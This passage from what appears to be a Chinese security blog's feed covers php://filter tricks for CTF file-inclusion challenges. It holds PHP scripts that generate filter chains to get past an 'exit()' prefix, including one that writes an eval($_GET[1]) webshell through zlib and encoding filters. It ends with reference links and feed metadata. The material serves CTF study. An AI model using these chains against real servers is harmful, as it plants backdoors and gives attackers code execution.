class="hljs-number">7</span><span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">8</span><span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">9</span><span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">10</span><span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">13</span><span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">14</span><span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">15</span><span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">16</span><span class="hljs-attribute">byte2be</span><span class="hljs-attribute">byte2le</span><span class="hljs-attribute">byte4be</span><span class="hljs-attribute">byte4le</span><span class="hljs-attribute">BASE64</span><span class="hljs-attribute">HTML</span>-ENTITIES<span class="hljs-attribute">7bit</span><span class="hljs-attribute">8bit</span><span class="hljs-attribute">EUC</span>-CN<span class="hljs-attribute">CP936</span><span class="hljs-attribute">GB18030</span><span class="hljs-attribute">HZ</span><span class="hljs-attribute">EUC</span>-TW<span class="hljs-attribute">CP950</span><span class="hljs-attribute">BIG</span>-<span class="hljs-number">5</span><span class="hljs-attribute">EUC</span>-KR<span class="hljs-attribute">UHC</span><span class="hljs-attribute">ISO</span>-<span class="hljs-number">2022</span>-KR<span class="hljs-attribute">Windows</span>-<span class="hljs-number">1251</span><span class="hljs-attribute">Windows</span>-<span class="hljs-number">1252</span><span class="hljs-attribute">CP866</span><span class="hljs-attribute">KOI8</span>-R<span class="hljs-attribute">KOI8</span>-U<span class="hljs-attribute">ArmSCII</span>-<span class="hljs-number">8</span></code></pre></div><h3 id="phpfuzz过滤器"><a href="#phpfuzz过滤器" class="headerlink" title="phpfuzz过滤器"></a>phpfuzz过滤器</h3><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$a</span> = [    <span class="hljs-string">&#x27;string.rot13&#x27;</span>,    <span class="hljs-string">&#x27;string.toupper&#x27;</span>,    <span class="hljs-string">&#x27;string.tolower&#x27;</span>,    <span class="hljs-string">&#x27;string.strip_tags&#x27;</span>,    <span class="hljs-string">&#x27;convert.base64-encode&#x27;</span>,    <span class="hljs-string">&#x27;convert.base64-decode&#x27;</span>,  <span class="hljs-string">&#x27;convert.quoted-printable-encode&#x27;</span>,  <span class="hljs-string">&#x27;convert.quoted-printable-decode&#x27;</span>,    <span class="hljs-string">&#x27;zlib.deflate&#x27;</span>,    <span class="hljs-string">&#x27;zlib.inflate&#x27;</span>,    <span class="hljs-string">&#x27;bzip2.compress&#x27;</span>,    <span class="hljs-string">&#x27;bzip2.decompress&#x27;</span>,    <span class="hljs-string">&#x27;UCS-4&#x27;</span>,    <span class="hljs-string">&#x27;UCS-4BE&#x27;</span>,    <span class="hljs-string">&#x27;UCS-2&#x27;</span> ,    <span class="hljs-string">&#x27;UCS-2BE&#x27;</span>,    <span class="hljs-string">&#x27;UCS-2LE&#x27;</span>,    <span class="hljs-string">&#x27;UTF-32&#x27;</span>,    <span class="hljs-string">&#x27;UTF-32BE&#x27;</span>,    <span class="hljs-string">&#x27;UTF-32LE&#x27;</span>,    <span class="hljs-string">&#x27;UTF-16&#x27;</span>,    <span class="hljs-string">&#x27;UTF-16BE&#x27;</span>,    <span class="hljs-string">&#x27;UTF-16LE&#x27;</span>,    <span class="hljs-string">&#x27;UTF-7&#x27;</span>,    <span class="hljs-string">&#x27;UTF7-IMAP&#x27;</span>,    <span class="hljs-string">&#x27;UTF-8&#x27;</span>,    <span class="hljs-string">&#x27;ASCII&#x27;</span>,    <span class="hljs-string">&#x27;EUC-JP&#x27;</span>,    <span class="hljs-string">&#x27;SJIS&#x27;</span>,    <span class="hljs-string">&#x27;eucJP-win&#x27;</span>,    <span class="hljs-string">&#x27;SJIS-win&#x27;</span>,    <span class="hljs-string">&#x27;ISO-2022-JP&#x27;</span>,    <span class="hljs-string">&#x27;ISO-2022-JP-MS&#x27;</span>,    <span class="hljs-string">&#x27;CP932&#x27;</span>,    <span class="hljs-string">&#x27;CP51932&#x27;</span>,    <span class="hljs-string">&#x27;SJIS-mac&#x27;</span>,    <span class="hljs-string">&#x27;SJIS-Mobile#DOCOMO&#x27;</span>,    <span class="hljs-string">&#x27;SJIS-Mobile#KDDI&#x27;</span>,    <span class="hljs-string">&#x27;SJIS-Mobile#SOFTBANK&#x27;</span>,    <span class="hljs-string">&#x27;UTF-8-Mobile#DOCOMO&#x27;</span>,    <span class="hljs-string">&#x27;UTF-8-Mobile#KDDI-A&#x27;</span>,    <span class="hljs-string">&#x27;UTF-8-Mobile#KDDI-B&#x27;</span>,    <span class="hljs-string">&#x27;UTF-8-Mobile#SOFTBANK&#x27;</span>,    <span class="hljs-string">&#x27;ISO-2022-JP-MOBILE#KDDI&#x27;</span>,    <span class="hljs-string">&#x27;JIS&#x27;</span>,    <span class="hljs-string">&#x27;JIS-ms&#x27;</span>,    <span class="hljs-string">&#x27;CP50220&#x27;</span>,    <span class="hljs-string">&#x27;CP50220raw&#x27;</span>,    <span class="hljs-string">&#x27;CP50221&#x27;</span>,    <span class="hljs-string">&#x27;CP50222&#x27;</span>,    <span class="hljs-string">&#x27;ISO-8859-1&#x27;</span>,    <span class="hljs-string">&#x27;ISO-8859-2&#x27;</span>,    <span class="hljs-string">&#x27;ISO-8859-3&#x27;</span>,    <span class="hljs-string">&#x27;ISO-8859-4&#x27;</span>,    <span class="hljs-string">&#x27;ISO-8859-5&#x27;</span>,    <span class="hljs-string">&#x27;ISO-8859-6&#x27;</span>,    <span class="hljs-string">&#x27;ISO-8859-7&#x27;</span>,    <span class="hljs-string">&#x27;ISO-8859-8&#x27;</span>,    <span class="hljs-string">&#x27;ISO-8859-9&#x27;</span>,    <span class="hljs-string">&#x27;ISO-8859-10&#x27;</span>,    <span class="hljs-string">&#x27;ISO-8859-13&#x27;</span>,    <span class="hljs-string">&#x27;ISO-8859-14&#x27;</span>,    <span class="hljs-string">&#x27;ISO-8859-15&#x27;</span>,    <span class="hljs-string">&#x27;ISO-8859-16&#x27;</span>,    <span class="hljs-string">&#x27;byte2be&#x27;</span>,    <span class="hljs-string">&#x27;byte2le&#x27;</span>,    <span class="hljs-string">&#x27;byte4be&#x27;</span>,    <span class="hljs-string">&#x27;byte4le&#x27;</span>,    <span class="hljs-string">&#x27;BASE64&#x27;</span>,    <span class="hljs-string">&#x27;HTML-ENTITIES&#x27;</span>,    <span class="hljs-string">&#x27;7bit&#x27;</span>,    <span class="hljs-string">&#x27;8bit&#x27;</span>,    <span class="hljs-string">&#x27;EUC-CN&#x27;</span>,    <span class="hljs-string">&#x27;CP936&#x27;</span>,    <span class="hljs-string">&#x27;GB18030&#x27;</span>,    <span class="hljs-string">&#x27;HZ&#x27;</span>,    <span class="hljs-string">&#x27;EUC-TW&#x27;</span>,    <span class="hljs-string">&#x27;CP950&#x27;</span>,    <span class="hljs-string">&#x27;BIG-5&#x27;</span>,    <span class="hljs-string">&#x27;EUC-KR&#x27;</span>,    <span class="hljs-string">&#x27;UHC&#x27;</span>,    <span class="hljs-string">&#x27;ISO-2022-KR&#x27;</span>,    <span class="hljs-string">&#x27;Windows-1251&#x27;</span>,    <span class="hljs-string">&#x27;Windows-1252&#x27;</span>,    <span class="hljs-string">&#x27;CP866&#x27;</span>,    <span class="hljs-string">&#x27;KOI8-R&#x27;</span>,    <span class="hljs-string">&#x27;KOI8-U&#x27;</span>,    <span class="hljs-string">&#x27;ArmSCII-8&#x27;</span>,];<span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$item</span>) &#123;    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&#x27;/iconv|UCS|UTF|rot|quoted|base64/i&#x27;</span>,<span class="hljs-variable">$item</span>))        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$item</span>,<span class="hljs-string">&quot;\n&quot;</span>;&#125;</code></pre></div><h3 id="poc生成脚本："><a href="#poc生成脚本：" class="headerlink" title="poc生成脚本："></a>poc生成脚本：</h3><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Generate</span></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$prefix</span> = <span class="hljs-string">&quot;&lt;?php exit();&quot;</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$poc</span> = <span class="hljs-string">&quot;&lt;?php phpinfo();?&gt;&quot;</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$base</span> = <span class="hljs-string">&quot;php://filter/write=&quot;</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$end</span> = <span class="hljs-string">&quot;/resource=drom.php&quot;</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$string</span> = [        <span class="hljs-string">&#x27;rot13&#x27;</span> =&gt; <span class="hljs-string">&#x27;str_rot13&#x27;</span>,        <span class="hljs-string">&#x27;toupper&#x27;</span> =&gt; <span class="hljs-string">&#x27;strtoupper&#x27;</span>,        <span class="hljs-string">&#x27;tolower&#x27;</span> =&gt; <span class="hljs-string">&#x27;strtolower&#x27;</span>,        <span class="hljs-string">&#x27;strip_tags&#x27;</span> =&gt; <span class="hljs-string">&#x27;strip_tags&#x27;</span>,    ];    <span class="hljs-keyword">public</span> <span class="hljs-variable">$zlib</span> = [        <span class="hljs-string">&#x27;deflate&#x27;</span>,        <span class="hljs-string">&#x27;inflate&#x27;</span>    ];    <span class="hljs-keyword">public</span> <span class="hljs-variable">$bzip2</span> = [        <span class="hljs-string">&#x27;compress&#x27;</span>,        <span class="hljs-string">&#x27;decompress&#x27;</span>    ];    <span class="hljs-keyword">public</span> <span class="hljs-variable">$convert</span> = [        <span class="hljs-string">&#x27;UCS-4&#x27;</span>,        <span class="hljs-string">&#x27;UCS-4BE&#x27;</span>,        <span class="hljs-string">&#x27;UCS-2&#x27;</span> ,        <span class="hljs-string">&#x27;UCS-2BE&#x27;</span>,        <span class="hljs-string">&#x27;UCS-2LE&#x27;</span>,        <span class="hljs-string">&#x27;UTF-32&#x27;</span>,        <span class="hljs-string">&#x27;UTF-32BE&#x27;</span>,        <span class="hljs-string">&#x27;UTF-32LE&#x27;</span>,        <span class="hljs-string">&#x27;UTF-16&#x27;</span>,        <span class="hljs-string">&#x27;UTF-16BE&#x27;</span>,        <span class="hljs-string">&#x27;UTF-16LE&#x27;</span>,        <span class="hljs-string">&#x27;UTF-7&#x27;</span>,        <span class="hljs-string">&#x27;UTF7-IMAP&#x27;</span>,        <span class="hljs-string">&#x27;UTF-8&#x27;</span>,        <span class="hljs-string">&#x27;ASCII&#x27;</span>,        <span class="hljs-string">&#x27;EUC-JP&#x27;</span>,        <span class="hljs-string">&#x27;SJIS&#x27;</span>,        <span class="hljs-string">&#x27;eucJP-win&#x27;</span>,        <span class="hljs-string">&#x27;SJIS-win&#x27;</span>,        <span class="hljs-string">&#x27;ISO-2022-JP&#x27;</span>,        <span class="hljs-string">&#x27;ISO-2022-JP-MS&#x27;</span>,        <span class="hljs-string">&#x27;CP932&#x27;</span>,        <span class="hljs-string">&#x27;CP51932&#x27;</span>,        <span class="hljs-string">&#x27;SJIS-mac&#x27;</span>,        <span class="hljs-string">&#x27;SJIS-Mobile#DOCOMO&#x27;</span>,        <span class="hljs-string">&#x27;SJIS-Mobile#KDDI&#x27;</span>,        <span class="hljs-string">&#x27;SJIS-Mobile#SOFTBANK&#x27;</span>,        <span class="hljs-string">&#x27;UTF-8-Mobile#DOCOMO&#x27;</span>,        <span class="hljs-string">&#x27;UTF-8-Mobile#KDDI-A&#x27;</span>,        <span class="hljs-string">&#x27;UTF-8-Mobile#KDDI-B&#x27;</span>,        <span class="hljs-string">&#x27;UTF-8-Mobile#SOFTBANK&#x27;</span>,        <span class="hljs-string">&#x27;ISO-2022-JP-MOBILE#KDDI&#x27;</span>,        <span class="hljs-string">&#x27;JIS&#x27;</span>,        <span class="hljs-string">&#x27;JIS-ms&#x27;</span>,        <span class="hljs-string">&#x27;CP50220&#x27;</span>,        <span class="hljs-string">&#x27;CP50220raw&#x27;</span>,        <span class="hljs-string">&#x27;CP50221&#x27;</span>,        <span class="hljs-string">&#x27;CP50222&#x27;</span>,        <span class="hljs-string">&#x27;ISO-8859-1&#x27;</span>,        <span class="hljs-string">&#x27;ISO-8859-2&#x27;</span>,        <span class="hljs-string">&#x27;ISO-8859-3&#x27;</span>,        <span class="hljs-string">&#x27;ISO-8859-4&#x27;</span>,        <span class="hljs-string">&#x27;ISO-8859-5&#x27;</span>,        <span class="hljs-string">&#x27;ISO-8859-6&#x27;</span>,        <span class="hljs-string">&#x27;ISO-8859-7&#x27;</span>,        <span class="hljs-string">&#x27;ISO-8859-8&#x27;</span>,        <span class="hljs-string">&#x27;ISO-8859-9&#x27;</span>,        <span class="hljs-string">&#x27;ISO-8859-10&#x27;</span>,        <span class="hljs-string">&#x27;ISO-8859-13&#x27;</span>,        <span class="hljs-string">&#x27;ISO-8859-14&#x27;</span>,        <span class="hljs-string">&#x27;ISO-8859-15&#x27;</span>,        <span class="hljs-string">&#x27;ISO-8859-16&#x27;</span>,        <span class="hljs-string">&#x27;byte2be&#x27;</span>,        <span class="hljs-string">&#x27;byte2le&#x27;</span>,        <span class="hljs-string">&#x27;byte4be&#x27;</span>,        <span class="hljs-string">&#x27;byte4le&#x27;</span>,        <span class="hljs-string">&#x27;BASE64&#x27;</span>,        <span class="hljs-string">&#x27;HTML-ENTITIES&#x27;</span>,        <span class="hljs-string">&#x27;7bit&#x27;</span>,        <span class="hljs-string">&#x27;8bit&#x27;</span>,        <span class="hljs-string">&#x27;EUC-CN&#x27;</span>,        <span class="hljs-string">&#x27;CP936&#x27;</span>,        <span class="hljs-string">&#x27;GB18030&#x27;</span>,        <span class="hljs-string">&#x27;HZ&#x27;</span>,        <span class="hljs-string">&#x27;EUC-TW&#x27;</span>,        <span class="hljs-string">&#x27;CP950&#x27;</span>,        <span class="hljs-string">&#x27;BIG-5&#x27;</span>,        <span class="hljs-string">&#x27;EUC-KR&#x27;</span>,        <span class="hljs-string">&#x27;UHC&#x27;</span>,        <span class="hljs-string">&#x27;ISO-2022-KR&#x27;</span>,        <span class="hljs-string">&#x27;Windows-1251&#x27;</span>,        <span class="hljs-string">&#x27;Windows-1252&#x27;</span>,        <span class="hljs-string">&#x27;CP866&#x27;</span>,        <span class="hljs-string">&#x27;KOI8-R&#x27;</span>,        <span class="hljs-string">&#x27;KOI8-U&#x27;</span>,        <span class="hljs-string">&#x27;ArmSCII-8&#x27;</span>,    ];    <span class="hljs-keyword">public</span> <span class="hljs-variable">$poc_stack</span> = [        <span class="hljs-string">&#x27;convert&#x27;</span> =&gt; [            <span class="hljs-string">&#x27;from&#x27;</span> =&gt; <span class="hljs-string">&#x27;UCS-2LE&#x27;</span>,            <span class="hljs-string">&#x27;to&#x27;</span> =&gt; <span class="hljs-string">&#x27;UCS-2BE&#x27;</span>        ],        <span class="hljs-string">&#x27;string&#x27;</span> =&gt; <span class="hljs-string">&#x27;rot13&#x27;</span>    ];    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">concatConvert</span>(<span class="hljs-params"><span class="hljs-variable">$convfrom</span>,<span class="hljs-variable">$convto</span></span>)</span>&#123;        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;convert.iconv.&#x27;</span>.<span class="hljs-variable">$convfrom</span>.<span class="hljs-string">&#x27;.&#x27;</span>.<span class="hljs-variable">$convto</span>.<span class="hljs-string">&#x27;|&#x27;</span>;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">concatString</span>(<span class="hljs-params"><span class="hljs-variable">$stringop</span></span>)</span>&#123;        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;string&#x27;</span>.<span class="hljs-string">&#x27;.&#x27;</span>.<span class="hljs-variable">$stringop</span>.<span class="hljs-string">&#x27;|&#x27;</span>;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">convert</span>(<span class="hljs-params"><span class="hljs-variable">$convfrom</span>,<span class="hljs-variable">$convto</span>,<span class="hljs-variable">$poc</span></span>)</span>&#123;        <span class="hljs-keyword">return</span> iconv(<span class="hljs-variable">$convfrom</span>,<span class="hljs-variable">$convto</span>,<span class="hljs-variable">$poc</span>);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">string</span>(<span class="hljs-params"><span class="hljs-variable">$stringop</span>,<span class="hljs-variable">$poc</span></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;string[<span class="hljs-variable">$stringop</span>](<span class="hljs-variable">$poc</span>);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Run</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-variable">$result</span> = <span class="hljs-string">&quot;&quot;</span>;        <span class="hljs-variable">$result</span> .= <span class="hljs-keyword">$this</span>-&gt;prefix;        <span class="hljs-variable">$result</span> .= <span class="hljs-keyword">$this</span>-&gt;base;        <span class="hljs-variable">$result_poc</span> = <span class="hljs-string">&quot;&quot;</span>;        <span class="hljs-keyword">foreach</span> (array_keys(<span class="hljs-keyword">$this</span>-&gt;poc_stack) <span class="hljs-keyword">as</span> <span class="hljs-variable">$item</span>) &#123;            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$item</span> == <span class="hljs-string">&#x27;string&#x27;</span>)&#123;                <span class="hljs-variable">$result</span> .= <span class="hljs-keyword">$this</span>-&gt;concatString(<span class="hljs-keyword">$this</span>-&gt;poc_stack[<span class="hljs-variable">$item</span>]);                <span class="hljs-keyword">$this</span>-&gt;poc = <span class="hljs-keyword">$this</span>-&gt;string(<span class="hljs-keyword">$this</span>-&gt;poc_stack[<span class="hljs-variable">$item</span>],<span class="hljs-keyword">$this</span>-&gt;poc);            &#125;<span class="hljs-keyword">elseif</span> (<span class="hljs-variable">$item</span>==<span class="hljs-string">&#x27;convert&#x27;</span>)&#123;                <span class="hljs-variable">$result</span> .= <span class="hljs-keyword">$this</span>-&gt;concatConvert(<span class="hljs-keyword">$this</span>-&gt;poc_stack[<span class="hljs-variable">$item</span>][<span class="hljs-string">&#x27;from&#x27;</span>],<span class="hljs-keyword">$this</span>-&gt;poc_stack[<span class="hljs-variable">$item</span>][<span class="hljs-string">&#x27;to&#x27;</span>]);                <span class="hljs-keyword">$this</span>-&gt;poc = <span class="hljs-keyword">$this</span>-&gt;convert(<span class="hljs-keyword">$this</span>-&gt;poc_stack[<span class="hljs-variable">$item</span>][<span class="hljs-string">&#x27;from&#x27;</span>],<span class="hljs-keyword">$this</span>-&gt;poc_stack[<span class="hljs-variable">$item</span>][<span class="hljs-string">&#x27;to&#x27;</span>],<span class="hljs-keyword">$this</span>-&gt;poc);            &#125;<span class="hljs-keyword">elseif</span> (<span class="hljs-variable">$item</span>==<span class="hljs-string">&#x27;$zlib&#x27;</span>)&#123;                ;            &#125;        &#125;        <span class="hljs-variable">$tmp</span> = <span class="hljs-variable">$result</span>;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;length:&quot;</span>,strlen(<span class="hljs-variable">$tmp</span>),<span class="hljs-string">&quot;\n&quot;</span>;        <span class="hljs-variable">$padding</span> = <span class="hljs-string">&quot;&quot;</span>;        <span class="hljs-keyword">switch</span> (<span class="hljs-keyword">$this</span>-&gt;poc_stack[<span class="hljs-string">&#x27;convert&#x27;</span>][<span class="hljs-string">&#x27;from&#x27;</span>])&#123;            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;UCS-2LE&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;UCS-2BE&#x27;</span>:                <span class="hljs-variable">$paddingnum</span> = strlen(<span class="hljs-variable">$tmp</span>)%<span class="hljs-number">2</span>;                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$paddingnum</span> !== <span class="hljs-number">0</span>)&#123;                    <span class="hljs-variable">$padding</span> = str_repeat(<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-variable">$paddingnum</span>);                &#125;                <span class="hljs-keyword">break</span>;            <span class="hljs-keyword">default</span>:                ;        &#125;                <span class="hljs-variable">$result</span> .= <span class="hljs-variable">$padding</span>;        <span class="hljs-variable">$result</span> .= <span class="hljs-keyword">$this</span>-&gt;poc;        <span class="hljs-variable">$result</span> .= <span class="hljs-keyword">$this</span>-&gt;end;        <span class="hljs-keyword">echo</span> substr(<span class="hljs-variable">$result</span>,strlen(<span class="hljs-keyword">$this</span>-&gt;prefix)),<span class="hljs-string">&quot;\n&quot;</span>;    &#125;&#125;<span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> Generate();<span class="hljs-variable">$a</span>-&gt;Run();</code></pre></div><h3 id="zlib-deflate与zlib-inflate"><a href="#zlib-deflate与zlib-inflate" class="headerlink" title="zlib.deflate与zlib.inflate"></a>zlib.deflate与zlib.inflate</h3><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$a</span> = [    <span class="hljs-string">&#x27;string.toupper&#x27;</span>,    <span class="hljs-string">&#x27;string.tolower&#x27;</span>,    <span class="hljs-string">&#x27;string.strip_tags&#x27;</span>,    <span class="hljs-string">&#x27;convert.base64-encode&#x27;</span>,    <span class="hljs-string">&#x27;convert.base64-decode&#x27;</span>,    <span class="hljs-string">&#x27;ASCII&#x27;</span>,    <span class="hljs-string">&#x27;EUC-JP&#x27;</span>,    <span class="hljs-string">&#x27;SJIS&#x27;</span>,    <span class="hljs-string">&#x27;eucJP-win&#x27;</span>,    <span class="hljs-string">&#x27;SJIS-win&#x27;</span>,    <span class="hljs-string">&#x27;ISO-2022-JP&#x27;</span>,    <span class="hljs-string">&#x27;ISO-2022-JP-MS&#x27;</span>,    <span class="hljs-string">&#x27;CP932&#x27;</span>,    <span class="hljs-string">&#x27;CP51932&#x27;</span>,    <span class="hljs-string">&#x27;SJIS-mac&#x27;</span>,    <span class="hljs-string">&#x27;SJIS-Mobile#DOCOMO&#x27;</span>,    <span class="hljs-string">&#x27;SJIS-Mobile#KDDI&#x27;</span>,    <span class="hljs-string">&#x27;SJIS-Mobile#SOFTBANK&#x27;</span>,    <span class="hljs-string">&#x27;ISO-2022-JP-MOBILE#KDDI&#x27;</span>,    <span class="hljs-string">&#x27;JIS&#x27;</span>,    <span class="hljs-string">&#x27;JIS-ms&#x27;</span>,    <span class="hljs-string">&#x27;CP50220&#x27;</span>,    <span class="hljs-string">&#x27;CP50220raw&#x27;</span>,    <span class="hljs-string">&#x27;CP50221&#x27;</span>,    <span class="hljs-string">&#x27;CP50222&#x27;</span>,    <span class="hljs-string">&#x27;ISO-8859-1&#x27;</span>,    <span class="hljs-string">&#x27;ISO-8859-2&#x27;</span>,    <span class="hljs-string">&#x27;ISO-8859-3&#x27;</span>,    <span class="hljs-string">&#x27;ISO-8859-4&#x27;</span>,    <span class="hljs-string">&#x27;ISO-8859-5&#x27;</span>,    <span class="hljs-string">&#x27;ISO-8859-6&#x27;</span>,    <span class="hljs-string">&#x27;ISO-8859-7&#x27;</span>,    <span class="hljs-string">&#x27;ISO-8859-8&#x27;</span>,    <span class="hljs-string">&#x27;ISO-8859-9&#x27;</span>,    <span class="hljs-string">&#x27;ISO-8859-10&#x27;</span>,    <span class="hljs-string">&#x27;ISO-8859-13&#x27;</span>,    <span class="hljs-string">&#x27;ISO-8859-14&#x27;</span>,    <span class="hljs-string">&#x27;ISO-8859-15&#x27;</span>,    <span class="hljs-string">&#x27;ISO-8859-16&#x27;</span>,    <span class="hljs-string">&#x27;byte2be&#x27;</span>,    <span class="hljs-string">&#x27;byte2le&#x27;</span>,    <span class="hljs-string">&#x27;byte4be&#x27;</span>,    <span class="hljs-string">&#x27;byte4le&#x27;</span>,    <span class="hljs-string">&#x27;BASE64&#x27;</span>,    <span class="hljs-string">&#x27;HTML-ENTITIES&#x27;</span>,    <span class="hljs-string">&#x27;7bit&#x27;</span>,    <span class="hljs-string">&#x27;8bit&#x27;</span>,    <span class="hljs-string">&#x27;EUC-CN&#x27;</span>,    <span class="hljs-string">&#x27;CP936&#x27;</span>,    <span class="hljs-string">&#x27;GB18030&#x27;</span>,    <span class="hljs-string">&#x27;HZ&#x27;</span>,    <span class="hljs-string">&#x27;EUC-TW&#x27;</span>,    <span class="hljs-string">&#x27;CP950&#x27;</span>,    <span class="hljs-string">&#x27;BIG-5&#x27;</span>,    <span class="hljs-string">&#x27;EUC-KR&#x27;</span>,    <span class="hljs-string">&#x27;UHC&#x27;</span>,    <span class="hljs-string">&#x27;ISO-2022-KR&#x27;</span>,    <span class="hljs-string">&#x27;Windows-1251&#x27;</span>,    <span class="hljs-string">&#x27;Windows-1252&#x27;</span>,    <span class="hljs-string">&#x27;CP866&#x27;</span>,    <span class="hljs-string">&#x27;KOI8-R&#x27;</span>,    <span class="hljs-string">&#x27;KOI8-U&#x27;</span>,    <span class="hljs-string">&#x27;ArmSCII-8&#x27;</span>,];@mkdir(<span class="hljs-string">&#x27;./test&#x27;</span>);@chdir(<span class="hljs-string">&#x27;./test&#x27;</span>);<span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$item</span>) &#123;    <span class="hljs-variable">$content</span> = <span class="hljs-string">&#x27;php://filter/zlib.deflate|&#x27;</span> . <span class="hljs-variable">$item</span> . <span class="hljs-string">&#x27;|zlib.inflate|?&gt;&lt;?php%0deval($_GET[1]);?&gt;/resource=Cyc1e&#x27;</span>.<span class="hljs-variable">$item</span>.<span class="hljs-string">&#x27;.php&#x27;</span>;    file_put_contents(<span class="hljs-variable">$content</span>, <span class="hljs-string">&#x27;&lt;?php exit();&#x27;</span> . <span class="hljs-variable">$content</span>);&#125;</code></pre></div><h1 id="参考及转载资料"><a href="#参考及转载资料" class="headerlink" title="参考及转载资料"></a>参考及转载资料</h1><ul><li><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">谈一谈php://filter的妙用</a></li><li><a href="https://cyc1e183.github.io/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/">关于file_put_contents的一些小测试</a></li><li><a href="https://cyc1e183.github.io/2020/08/04/WMctf2020-Checkin%E5%87%BA%E9%A2%98%E6%83%B3%E6%B3%95-%E9%A2%98%E8%A7%A3/">WMctf2020 Checkin出题想法&amp;题解</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;php-filter利用手法&quot;&gt;&lt;a href=&quot;#php-filter利用手法&quot; class=&quot;headerlink&quot; title=&quot;php://filter利用手法&quot;&gt;&lt;/a&gt;php://filter利用手法&lt;/h1&gt;&lt;p&gt;常见payload&lt;/p&gt;
&lt;p&gt;&lt;</summary>
      
    
    
    
    <category term="web安全" scheme="https://greydr34d.github.io/categories/web%E5%AE%89%E5%85%A8/"/>
    
    <category term="文件包含" scheme="https://greydr34d.github.io/categories/web%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
    <category term="php" scheme="https://greydr34d.github.io/categories/php/"/>
    
    <category term="伪协议" scheme="https://greydr34d.github.io/categories/php/%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
    
    
    <category term="php" scheme="https://greydr34d.github.io/tags/php/"/>
    
    <category term="web安全" scheme="https://greydr34d.github.io/tags/web%E5%AE%89%E5%85%A8/"/>
    
    <category term="ctf" scheme="https://greydr34d.github.io/tags/ctf/"/>
    
    <category term="文件包含" scheme="https://greydr34d.github.io/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
    <category term="php://filer" scheme="https://greydr34d.github.io/tags/php-filer/"/>
    
  </entry>
  
  <entry>
    <title>域渗透分析工具 BloodHound-基本安装</title>
    <link href="https://greydr34d.github.io/2020/10/14/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7-BloodHound-%E5%9F%BA%E6%9C%AC%E5%AE%89%E8%A3%85/"/>
    <id>https://greydr34d.github.io/2020/10/14/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7-BloodHound-%E5%9F%BA%E6%9C%AC%E5%AE%89%E8%A3%85/</id>
    <published>2020-10-14T11:39:25.000Z</published>
    <updated>2021-03-15T05:01:24.000Z</updated>
    
